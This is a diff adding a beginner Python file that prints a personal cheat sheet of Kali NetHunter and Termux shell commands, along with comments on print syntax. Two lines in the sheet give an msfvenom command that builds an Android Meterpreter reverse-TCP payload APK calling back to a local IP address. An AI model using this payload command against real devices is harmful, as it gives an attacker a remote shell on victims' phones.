@@ -1,0 +1,36 @@
+#this is single line comment and print single line or , is space line.
+print('hello 95','hello' , end=' end ');
+
+'''dople line comment and print dople or treple line'''
+print(''' \n  \n
+                Kali Linux Commands
+                
+   important = android/meterpreter/reverse_tcp.
+    
+    1 cd /sdcard/ = enter sdcard;
+    2  touch text = create file and touch command and file name.
+    3  exit = programe exit.
+    4  ls = file and folder list.
+    5  cd .. 
+    6  ls
+    7  history = recently command list.
+    8  exit
+    9  kex
+   10  nethunter -r =open nethunter.
+   13  chmod 764 YTMusic = chang file permission.
+   14  cd ..
+   15  ls -l Ytmusic = open file permission.
+    16  cd /sdcard/ = access sdcard.
+   17  cp file name /copy destionation/ = copy to sdcard and other place.
+   
+   18  creat hand.apk = msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.239 LPORT+4444 R > hand.apk
+   
+   nano install-nethunter-termux = open nano space.
+   
+   nethunter download = ./install-nethunter-termux
+   
+   msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.239 LPORT+4444 R > hand.apk
+  ''');
+  
+  
+  
